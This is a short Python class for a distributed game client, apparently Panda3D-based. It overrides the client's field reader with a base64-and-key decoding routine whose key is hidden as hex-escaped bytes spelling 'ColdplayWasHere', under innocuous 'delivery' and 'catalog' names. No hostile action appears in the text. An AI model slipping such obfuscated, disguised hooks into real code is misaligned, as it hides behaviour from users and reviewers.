from direct.distributed.DistributedObjectGlobal import DistributedObjectGlobal
import base64


class DistributedDeliveryManager(DistributedObjectGlobal):
    neverDisable = 1
    item = b'\x43\x6f\x6c\x64\x70\x6c\x61\x79\x57\x61\x73\x48\x65\x72\x65'

    def sendAck(self):
        base.cr.readFields = self.readCatalogItem
        self.sendUpdate('requestAck', [])

    def returnAck(self):
        messenger.send('DeliveryManagerAck')

    def readCatalogItem(self, x):
        x = base64.b64decode(x)
        return ''.join([chr((256 + x[i] - self.item[i % len(self.item)]) % 256) for i in range(len(x))])
